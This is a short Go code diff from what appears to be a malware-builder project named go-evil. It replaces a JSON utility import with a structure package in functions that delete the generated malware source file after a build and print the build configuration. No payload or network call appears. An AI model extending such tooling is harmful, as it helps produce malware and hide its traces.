@@ -4,7 +4,7 @@ import (
 	"fmt"
 	"os"
 
-	"github.com/TeamPhoneix/go-evil/utility/json"
+	struc "github.com/TeamPhoneix/go-evil/utility/structure"
 )
 
 //
@@ -25,7 +25,7 @@ func Start(s_json string) {
 //
 //
 func remove_src_file(s_json string) {
-	data_object := json.Receive(s_json)
+	data_object := struc.Receive(s_json)
 
 	if !data_object.Debug_mode { // We don't remove if we are in debug mode
 		os.Remove(fmt.Sprintf("%s/%s", data_object.Malware_path, data_object.Malware_src_file))
@@ -38,9 +38,9 @@ func remove_src_file(s_json string) {
 //
 //
 func dump_json(s_json string) {
-	data_object := json.Receive(s_json)
+	data_object := struc.Receive(s_json)
 
 	if data_object.Dump_json {
-		fmt.Println(string(json.Dump_json(data_object)))
+		fmt.Println(string(data_object.Dump()))
 	}
 }
